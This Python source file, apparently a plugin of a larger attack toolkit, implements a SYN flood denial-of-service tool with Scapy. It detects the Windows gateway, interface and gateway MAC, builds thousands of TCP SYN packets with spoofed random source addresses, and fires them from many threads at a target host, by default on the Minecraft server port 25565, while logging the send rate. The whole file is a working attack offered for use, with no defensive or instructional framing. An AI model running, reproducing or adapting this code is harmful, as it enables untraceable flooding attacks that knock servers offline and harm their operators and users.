from plugins.common import *
from scapy.all import IP, TCP, sendp, RandShort, RandIP, conf, Ether, get_if_list, get_if_hwaddr
import threading
import time
import subprocess
import socket

conf.verb = 0

def get_gateway():
    result = subprocess.run('route print 0.0.0.0', shell=True, capture_output=True, text=True)
    for line in result.stdout.splitlines():
        parts = line.split()
        if len(parts) >= 3 and parts[0] == '0.0.0.0':
            return parts[2]
    return None

def get_active_iface():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
        s.close()

        result = subprocess.run('ipconfig', shell=True, capture_output=True, text=True)
        lines = result.stdout.splitlines()

        adapter_name = None
        for i, line in enumerate(lines):
            if 'adapter' in line.lower():
                adapter_name = line.strip().rstrip(':')
            if local_ip in line:
                break

        # map adapter name -> NPF GUID
        getmac = subprocess.run('getmac /v /fo csv', shell=True, capture_output=True, text=True)
        for line in getmac.stdout.splitlines()[1:]:
            parts = [p.strip('"') for p in line.split('","')]
            if len(parts) >= 4 and adapter_name and parts[0] in adapter_name:
                guid = parts[3].replace('\\Device\\Tcpip_', '')
                return f'\\Device\\NPF_{guid}', local_ip

        # fallback — scan all interfaces
        for iface in get_if_list():
            if 'NPF_Loopback' in iface:
                continue
            return iface, local_ip

    except Exception as e:
        return None, None

def get_gw_mac(gw):
    subprocess.run(f'ping {gw} -n 1', shell=True, capture_output=True)
    result = subprocess.run(f'arp -a {gw}', shell=True, capture_output=True, text=True)
    for line in result.stdout.splitlines():
        if gw in line:
            parts = line.split()
            for p in parts:
                if '-' in p and len(p) == 17:
                    return p.replace('-', ':')
    return None

def synflood(server, threads):
    try:
        if ':' in server:
            host, port = server.split(':')
        else:
            host = server
            port = 25565

        port = int(port)
        threads = int(threads)
        count = [0]
        stop = threading.Event()

        gw = get_gateway()
        if not gw:
            logging.error('Cannot find gateway')
            return
        logging.info(f'Gateway: {gw}')

        iface, local_ip = get_active_iface()
        if not iface:
            logging.error('Cannot detect active interface')
            return
        logging.info(f'Interface: {iface}')
        logging.info(f'Local IP: {local_ip}')
        conf.iface = iface

        gw_mac = get_gw_mac(gw)
        if not gw_mac:
            logging.error('Cannot find gateway MAC')
            return
        logging.info(f'Gateway MAC: {gw_mac}')
        logging.info('Building SYN packet pool...')

        pkts = []
        for _ in range(5000):
            pkt = (
                Ether(dst=gw_mac) /
                IP(src=RandIP(), dst=host) /
                TCP(sport=RandShort(), dport=port, flags='S', seq=RandShort(), window=65535)
            )
            pkts.append(pkt)

        logging.info(f'Starting SYN flood -> {host}:{port} | {threads} threads | Ctrl+C to stop')

        def worker():
            i = 0
            while not stop.is_set():
                try:
                    sendp(pkts[i % 5000], iface=iface, verbose=False, realtime=False)
                    count[0] += 1
                    i += 1
                except:
                    pass

        def stats():
            prev = 0
            while not stop.is_set():
                time.sleep(1)
                diff = count[0] - prev
                prev = count[0]
                mbps = (diff * 60 * 8) / 1_000_000
                logging.info(f'SYN sent: {count[0]} | {diff} pps | ~{mbps:.2f} Mbps')

        pool = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
        pool.append(threading.Thread(target=stats, daemon=True))
        for t in pool:
            t.start()

        while not stop.is_set():
            time.sleep(0.1)

    except KeyboardInterrupt:
        stop.set()
        logging.success(f'Stopped | Total SYN sent: {count[0]}')
    except Exception as e:
        logging.error(e)